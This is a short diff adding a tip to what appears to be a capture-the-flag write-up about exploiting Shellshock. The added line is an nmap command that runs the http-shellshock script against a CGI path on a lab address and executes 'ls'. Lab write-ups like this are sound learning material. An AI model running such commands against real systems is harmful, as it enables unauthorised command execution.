@@ -70,3 +70,4 @@ https://www.sevenlayers.com/index.php/125-exploiting-shellshock
 # ${{\color{purple}Point of Improvement}}\ $
 
 * Don't hesitate to use several extensions during the recon phase ``-x sh,pl``
+* nmap is possible for the discovery part : ``nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56``
